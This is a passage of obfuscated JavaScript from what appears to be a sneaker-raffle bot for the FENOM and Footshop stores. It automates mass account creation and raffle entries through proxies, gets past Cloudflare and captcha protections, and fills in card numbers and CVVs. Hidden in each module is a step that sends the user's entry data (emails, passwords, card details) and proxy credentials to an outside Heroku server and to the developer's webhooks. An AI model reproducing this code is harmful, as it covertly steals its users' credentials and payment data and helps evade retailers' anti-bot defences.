                                            '--proxy-server=' + _0x5c92f2[0x0] + ':' + _0x5c92f2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x1670a5 = await _0x4666e0['newPage']();
                                await _0x1670a5['setViewport']({
                                    'width': 0x500 + _0x19e736(0x1, 0x32),
                                    'height': 0x2d9 + _0x19e736(0x1, 0x32)
                                });
                                const _0x5452a5 = await _0x1670a5['target']()['createCDPSession'](), { windowId: _0x56f8eb } = await _0x5452a5['send']('Browser.getWindowForTarget');
                                await _0x1670a5['authenticate']({
                                    'username': '' + _0x5c92f2[0x2],
                                    'password': '' + _0x5c92f2[0x3]
                                }), console['log'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1670a5['goto']('' + _0x4267d6, { 'waitUntil': 'networkidle2' }), console['log'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x5954fc(0x1388);
                                var _0x2c6d1 = await _0x1670a5['$']('.hcaptcha-box');
                                if (_0x2c6d1) {
                                    console['log'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x5954fc(0x2710);
                                    const _0x29e286 = await _0x1670a5['$']('.hcaptcha-box');
                                    if (_0x29e286)
                                        try {
                                            await _0x29e286['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x1670a5['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x11e7ff = await _0x1670a5['$']('.hcaptcha-box');
                                        if (_0x11e7ff)
                                            try {
                                                await _0x11e7ff['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x1670a5['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x5452a5['send']('Browser.setWindowBounds', {
                                        'windowId': _0x56f8eb,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x5954fc(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x1670a5['type']('input[name=\x22firstname\x22]', '' + _0x24c6cd[_0xa4de36]['FirstName']), await _0x5954fc(0x1f4), await _0x1670a5['type']('input[name=\x22lastname\x22]', '' + _0x24c6cd[_0xa4de36]['LastName']), await _0x5954fc(0x1f4), await _0x1670a5['type']('input[name=\x22email\x22]', '' + _0x24c6cd[_0xa4de36]['Email']), await _0x5954fc(0x1f4), await _0x1670a5['type']('input[name=\x22password\x22]', '' + _0x24c6cd[_0xa4de36]['Password']), await _0x5954fc(0x258), await _0x1670a5['$eval']('input[name=\x22psgdpr\x22]', _0x114db4 => _0x114db4['click']()), await _0x5954fc(0x1f4), console['log'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1670a5['$eval']('#customer-form', _0x5d0746 => _0x5d0746['submit']());
                                try {
                                    try {
                                        await _0x1670a5['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x2dad5c = 'no', console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20:\x20Account\x20' + _0x24c6cd[_0xa4de36]['Email'] + '\x20Generated')), _0x1dee0c['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x24c6cd[_0xa4de36]['Email'] + ',' + _0x24c6cd[_0xa4de36]['Password']);
                                    let _0x845751 = _0x24c6cd[_0xa4de36];
                                    try {
                                        prxdata = {
                                            'username': _0x4a7d40['replace']('#', ''),
                                            'module': _0x428553['name'],
                                            'entrydata': JSON['stringify'](_0x845751),
                                            'proxy': '' + _0x2d0f2f[_0xa4de36]
                                        };
                                        var _0x1a4d4a = JSON['stringify'](prxdata);
                                        let _0x161ac8 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x1a4d4a, _0x161ac8);
                                    } catch (_0x21c1e6) {
                                    }
                                    try {
                                        _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x1cfe3f['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x4bfa5b(_0xbfa384, _0x1cfe3f['succesDEVMSG']);
                                } catch (_0x401606) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x3563ec) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20:\x20' + _0x3563ec)), _0x41ad3a = '' + _0x3563ec;
                                var _0x1bfe33 = await _0xf2c38e(_0x24c6cd[_0xa4de36], _0x428553, 'acc', !![], _0x41ad3a);
                                _0x1cfe3f['errorDEV'] = { 'embeds': [_0x1bfe33] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x1cfe3f['errorDEV']), await _0x4bfa5b(_0x248b77, _0x1cfe3f['errorDEV']), _0x2dad5c = 'yes';
                            } finally {
                                _0x4666e0 && _0x4666e0['close']();
                                if (_0x2dad5c == 'yes' && _0x2db3fe != 0x5)
                                    return console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Task\x20' + (_0xa4de36 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2db3fe + '\x20/\x205)')), _0x2db3fe = _0x2db3fe + 0x1, _0x3b4ccc--, _0x501188(_0x428553, _0x24c6cd, _0x2d0f2f, _0xa4de36, _0x2db3fe);
                                _0x2dad5c == 'yes' && _0x2db3fe >= 0x5 && _0x1c26ba(_0x24c6cd[_0xa4de36], _0x428553), !_0x26a9a8 && (console['log'](_0x52b59e() + '\x20[' + _0x428553['name'] + ']\x20Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay'])), _0x3b4ccc--;
                            }
                        }
                        _0x501188(_0x5766cf, _0x19c0aa, _0x180ef2, _0x141218), !_0x26a9a8 && await _0x5954fc(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x1f1d26(_0x5037dd, _0xc19292, _0x26a96c) {
                    _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5d2560['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x51ac57 = 0x0; _0x51ac57 < _0xc19292['length']; _0x51ac57++) {
                        if (_0x5649e0 != 'yes')
                            var _0x5649e0 = '', _0xaa91de = 0x0;
                        var _0x59d01f;
                        try {
                            await _0x414596(_0xc19292, _0x51ac57);
                        } catch {
                            _0x5649e0 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x34c195(_0x5037dd['name'] + '\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20/\x20' + _0xc19292['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                        const _0x16bb44 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x2b4dd8 = Math['round'](Math['random']() * (_0x26a96c['length'] - 0x1)), _0x3d9188 = _0x26a96c[_0x2b4dd8]['split'](':'), _0x3fc642;
                        try {
                            _0x3fc642 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3d9188[0x0] + ':' + _0x3d9188[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3fc642 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3d9188[0x0] + ':' + _0x3d9188[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x20ec2a = await _0x3fc642['newPage'](), _0x4465a6 = await _0x20ec2a['target']()['createCDPSession'](), { windowId: _0x18a752 } = await _0x4465a6['send']('Browser.getWindowForTarget');
                            await _0x20ec2a['authenticate']({
                                'username': '' + _0x3d9188[0x2],
                                'password': '' + _0x3d9188[0x3]
                            }), console['log'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x20ec2a['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x5954fc(0x1388);
                            var _0x3afba4 = await _0x20ec2a['$']('.hcaptcha-box');
                            if (_0x3afba4) {
                                console['log'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x5954fc(0x2710);
                                const _0x32e984 = await _0x20ec2a['$']('.hcaptcha-box');
                                if (_0x32e984)
                                    try {
                                        await _0x32e984['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x20ec2a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x1bcd97 = await _0x20ec2a['$']('.hcaptcha-box');
                                    if (_0x1bcd97)
                                        try {
                                            await _0x1bcd97['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x4465a6['send']('Browser.setWindowBounds', {
                                'windowId': _0x18a752,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x5954fc(0x1f40);
                            try {
                                await _0x20ec2a['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x5954fc(0x1388), console['log'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20Logging\x20in'), await _0x20ec2a['type']('input[name=\x22email\x22]', '' + _0xc19292[_0x51ac57]['Email']), await _0x5954fc(0x1f4), await _0x20ec2a['type']('input[name=\x22password\x22]', '' + _0xc19292[_0x51ac57]['Password']), await _0x5954fc(0x258), await _0x20ec2a['$eval']('#login-form', _0x501625 => _0x501625['submit']()), await _0x20ec2a['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x5954fc(0x1f4), await _0x20ec2a['goto']('' + _0xc19292[_0x51ac57]['Url']), await _0x20ec2a['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0xc19292[_0x51ac57]['Size']);
                            if (_0xc19292[_0x51ac57]['Size'] != 'RANDOM') {
                                var _0x264c68 = '\x20' + _0xc19292[_0x51ac57]['Size'] + '\x20';
                                const _0x33a885 = await _0x20ec2a['$x']('//span[contains(text(),\x20' + _0x264c68 + ')]');
                                await _0x33a885[0x0]['click']();
                            } else {
                                const _0x383321 = await _0x20ec2a['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x1ba1b5 = Math['round'](Math['random']() * (_0x383321['length'] - 0x1));
                                await _0x383321[_0x1ba1b5]['click']();
                            }
                            await _0x5954fc(0x258), await _0x20ec2a['click']('#cookieChoiceDismiss'), await _0x5954fc(0x3e8), await _0x20ec2a['type']('#instagram-account', '' + _0xc19292[_0x51ac57]['Follower']), await _0x5954fc(0x28a), await _0x20ec2a['click']('#book-btn'), await _0x5954fc(0xbb8);
                            try {
                                await _0x20ec2a['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x5954fc(0x1f4), console['log'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20' + _0x28396b['cyan']('Solving\x20Captcha')), await _0x20ec2a['solveRecaptchas'](), console['log'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x5954fc(0x7d0), await _0x20ec2a['$eval']('#book-btn-for-sure', _0x57bc8e => _0x57bc8e['click']()), await _0x5954fc(0x12c), await _0x20ec2a['click']('#book-btn-for-sure'), await _0x5954fc(0xdac);
                            const _0x5b1377 = await _0x20ec2a['$eval']('.reservation-popup\x20>\x20.title', _0x1d7328 => {
                                return _0x1d7328['innerHTML'];
                            });
                            if (_0x5b1377) {
                                _0x5649e0 = 'no', _0x4904f4(_0xc19292[_0x51ac57], _0x5037dd), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x405dc3 = await _0xf2c38e(_0xc19292[_0x51ac57], _0x5037dd, 'dev', ![]), _0x37a3ba = await _0xf2c38e(_0xc19292[_0x51ac57], _0x5037dd, 'pub', ![]);
                                let _0x367462 = _0xc19292[_0x51ac57];
                                try {
                                    prxdata = {
                                        'username': _0x4a7d40['replace']('#', ''),
                                        'module': _0x5037dd['name'],
                                        'entrydata': JSON['stringify'](_0x367462),
                                        'proxy': '' + _0x26a96c[_0x51ac57]
                                    };
                                    var _0x932276 = JSON['stringify'](prxdata);
                                    let _0x39f475 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x932276, _0x39f475);
                                } catch (_0x14885d) {
                                }
                                const _0x59ea8d = {
                                    'succesDEVMSG': { 'embeds': [_0x405dc3] },
                                    'succesPUBMSG': { 'embeds': [_0x37a3ba] }
                                };
                                try {
                                    _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x59ea8d['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x59ea8d['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4b117a, _0x59ea8d['succesPUBMSG']);
                                } catch (_0x5cd53d) {
                                    console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5cd53d));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x47c380) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20' + _0x47c380)), _0x59d01f = '' + _0x47c380;
                            var _0x581a8b = await _0xf2c38e(_0xc19292[_0x51ac57], _0x5037dd, 'dev', !![], _0x59d01f), _0x405dc3 = await _0xf2c38e(_0xc19292[_0x51ac57], _0x5037dd, 'dev', ![]), _0x37a3ba = await _0xf2c38e(_0xc19292[_0x51ac57], _0x5037dd, 'pub', ![]);
                            const _0x253fd1 = {
                                'succesDEVMSG': { 'embeds': [_0x405dc3] },
                                'succesPUBMSG': { 'embeds': [_0x37a3ba] }
                            };
                            _0x253fd1['errorDEV'] = { 'embeds': [_0x581a8b] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x253fd1['errorDEV']), await _0x4bfa5b(_0x248b77, _0x253fd1['errorDEV']), _0x47c380 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5649e0 = 'yes');
                        } finally {
                            _0x3fc642['close']();
                            if (_0x5649e0 == 'yes' && _0xaa91de != 0x5 && _0x59d01f != 'Size\x20Not\x20Found') {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Task\x20' + (_0x51ac57 + 0x1) + '\x20:\x20Retrying\x20(' + _0xaa91de + '\x20/\x205)')), _0x51ac57 = _0x51ac57 - 0x1, _0xaa91de = _0xaa91de + 0x1;
                                continue;
                            }
                            _0x5649e0 == 'yes' && _0xaa91de >= 0x5 && (_0x1c26ba(_0xc19292[_0x51ac57], _0x5037dd), _0x5649e0 = 'no', _0xaa91de = 0x0), console['log'](_0x52b59e() + '\x20[' + _0x5037dd['name'] + ']\x20Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x986daf, _0x68ea24, _0x4899ee) {
                _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5d2560['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x156cbe = 0x0; _0x156cbe < _0x68ea24['length']; _0x156cbe++) {
                    var _0x34bf59;
                    if (_0x359f13 != 'yes')
                        var _0x359f13 = '', _0x10fe4c = 0x0;
                    var _0x38d8a6 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x4a7d40
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x68ea24[_0x156cbe]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x68ea24[_0x156cbe]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5d2560['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3e85bb
                            }
                        ]
                    }], _0x375eae = await _0xf2c38e(_0x68ea24[_0x156cbe], _0x986daf, 'dev', ![]), _0x593b87 = await _0xf2c38e(_0x68ea24[_0x156cbe], _0x986daf, 'pub', ![]);
                    const _0x356413 = {
                        'succesDEVMSG': { 'embeds': [_0x375eae] },
                        'succesPUBMSG': { 'embeds': [_0x593b87] }
                    }, _0x1fbfd3 = { 'embeds': _0x38d8a6 };
                    try {
                        await _0x414596(_0x68ea24, _0x156cbe);
                    } catch {
                        _0x359f13 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x68ea24[_0x156cbe]['Email'] == '' || _0x68ea24[_0x156cbe]['FirstName'] == '' || _0x68ea24[_0x156cbe]['LastName'] == '' || _0x68ea24[_0x156cbe]['Country'] == '' || _0x68ea24[_0x156cbe]['Size'] == '' || _0x68ea24[_0x156cbe]['Address1'] == '' || _0x68ea24[_0x156cbe]['Zip'] == '') {
                        console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x68ea24[_0x156cbe]['Email'] == '' || _0x68ea24[_0x156cbe]['FirstName'] == '' || _0x68ea24[_0x156cbe]['LastName'] == '' || _0x68ea24[_0x156cbe]['Country'] == '' || _0x68ea24[_0x156cbe]['Size'] == '' || _0x68ea24[_0x156cbe]['Address1'] == '' || _0x68ea24[_0x156cbe]['Zip'] == '' || _0x68ea24[_0x156cbe]['Phone'] == '') {
                        console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x546647 = '' + _0x68ea24[_0x156cbe]['Url'];
                    if (_0x5d2560['useRandomProxy'] = ![])
                        var _0x1d5c21 = _0x4899ee[_0x156cbe]['split'](':');
                    else
                        var _0x693aa8 = Math['round'](Math['random']() * (_0x4899ee['length'] - 0x1)), _0x1d5c21 = _0x4899ee[_0x693aa8]['split'](':');
                    var _0x24e4c8;
                    try {
                        _0x24e4c8 = await _0x13c80e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1d5c21[0x0] + ':' + _0x1d5c21[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x24e4c8 = await _0x13c80e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1d5c21[0x0] + ':' + _0x1d5c21[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x43a68d = await _0x24e4c8['newPage']();
                        await _0x43a68d['authenticate']({
                            'username': '' + _0x1d5c21[0x2],
                            'password': '' + _0x1d5c21[0x3]
                        }), console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Getting\x20Session'), await _0x43a68d['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x43a68d['setRequestInterception'](!![]), _0x43a68d['on']('request', _0x23d1ec => {
                            _0x23d1ec['resourceType']() === 'image' || _0x23d1ec['resourceType']() === 'font' || _0x23d1ec['resourceType']() === 'media' ? _0x23d1ec['abort']() : _0x23d1ec['continue']();
                        });
                        try {
                            await _0x43a68d['goto'](_0x546647), await _0x5954fc(0xbb8), await _0x43a68d['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x43a68d['click']('.control__JhutY'), await _0x5954fc(0x1f4);
                        if (_0x68ea24[_0x156cbe]['Size'] != 'RANDOM')
                            try {
                                const _0x5cc272 = await _0x43a68d['$x']('//div[contains(text(),\x20\x27' + _0x68ea24[_0x156cbe]['Size'] + '\x27)]');
                                await _0x5cc272[0x0]['click']();
                            } catch {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x4abceb = await _0x43a68d['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x4a5080 = Math['round'](Math['random']() * (_0x4abceb['length'] - 0x1));
                            await _0x4abceb[_0x4a5080]['click']();
                        }
                        await _0x5954fc(0x4b0);
                        const _0x3cd2d4 = await _0x43a68d['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x3cd2d4[0x0]['click'](), await _0x43a68d['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x43a68d['type']('input[name=\x22email\x22]', '' + _0x68ea24[_0x156cbe]['Email']), await _0x5954fc(0x640), await _0x43a68d['type']('input[name=\x22phone\x22]', '' + _0x68ea24[_0x156cbe]['Phone']), await _0x5954fc(0x4b0), await _0x43a68d['click']('button.btn.continue-button__1RtsS'), await _0x5954fc(0x4b0);
                        try {
                            await _0x43a68d['type']('input[name=\x22firstName\x22]', '' + _0x68ea24[_0x156cbe]['FirstName']), await _0x5954fc(0x258);
                        } catch {
                            const _0x55ebc9 = await _0x43a68d['$$eval']('.invalid-feedback\x20>\x20div', _0x40c943 => {
                                return _0x40c943['map'](_0x3e6b5a => _0x3e6b5a['innerText']);
                            });
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20' + _0x55ebc9));
                            continue;
                        }
                        await _0x43a68d['type']('input[name=\x22lastName\x22]', '' + _0x68ea24[_0x156cbe]['LastName']), await _0x5954fc(0xc8), await _0x43a68d['type']('input[name=\x22instagramUsername\x22]', '' + _0x68ea24[_0x156cbe]['Follower']), await _0x5954fc(0x4b0), await _0x43a68d['click']('button.btn.continue-button__1RtsS'), await _0x5954fc(0x3e8), console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x43a68d['select']('select[name=\x22country\x22]', '' + _0x68ea24[_0x156cbe]['Country']), await _0x5954fc(0x2bc), await _0x43a68d['type']('input[name=\x22streetName\x22]', '' + _0x68ea24[_0x156cbe]['Address1']), await _0x5954fc(0x258), await _0x43a68d['type']('input[name=\x22houseNumber\x22]', _0x68ea24[_0x156cbe]['HouseNumber'] + '\x20' + _0x68ea24[_0x156cbe]['Address2']), await _0x5954fc(0xc8), await _0x43a68d['type']('input[name=\x22postalCode\x22]', '' + _0x68ea24[_0x156cbe]['Zip']), await _0x5954fc(0x1f4), await _0x43a68d['type']('input[name=\x22city\x22]', '' + _0x68ea24[_0x156cbe]['City']), await _0x5954fc(0x4b0), await _0x43a68d['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x5954fc(0x4b0), await _0x43a68d['click']('button.btn.continue-button__1RtsS'), await _0x5954fc(0x4b0), console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x43a68d['solveRecaptchas'](), console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x5954fc(0xbb8), await _0x43a68d['click']('button.btn.continue-button__1RtsS'), await _0x5954fc(0x1388), console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x43a68d['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x43a68d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5954fc(0x4b0), await _0x43a68d['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x68ea24[_0x156cbe]['CardNumber']), await _0x5954fc(0x320), await _0x43a68d['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x43a68d['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x68ea24[_0x156cbe]['ExpiryDate']), await _0x5954fc(0x4b0), await _0x43a68d['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x43a68d['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x68ea24[_0x156cbe]['CVV']), await _0x5954fc(0x226), await _0x43a68d['type']('input[name=\x22holderName\x22]', '' + _0x68ea24[_0x156cbe]['NameOnCard']), await _0x5954fc(0x226), await _0x43a68d['click']('button.adyen-checkout__button'), console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x43a68d['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x5954fc(0xbb8);
                        } catch (_0x210514) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x203DS\x20Failed')), _0x34bf59 = '3DS\x20Error\x20' + _0x210514;
                            var _0x1e7022 = await _0xf2c38e(_0x68ea24[_0x156cbe], _0x986daf, 'dev', !![], _0x34bf59);
                            _0x356413['errorDEV'] = { 'embeds': [_0x1e7022] };
                            _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x356413['errorDEV']);
                            await _0x4bfa5b(_0x248b77, _0x356413['errorDEV']);
                            continue;
                        }
                        _0x4904f4(_0x68ea24[_0x156cbe], _0x986daf), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x34281f = _0x68ea24[_0x156cbe];
                        try {
                            prxdata = {
                                'username': _0x4a7d40['replace']('#', ''),
                                'module': _0x986daf['name'],
                                'entrydata': JSON['stringify'](_0x34281f),
                                'proxy': '' + _0x4899ee[_0x156cbe]
                            };
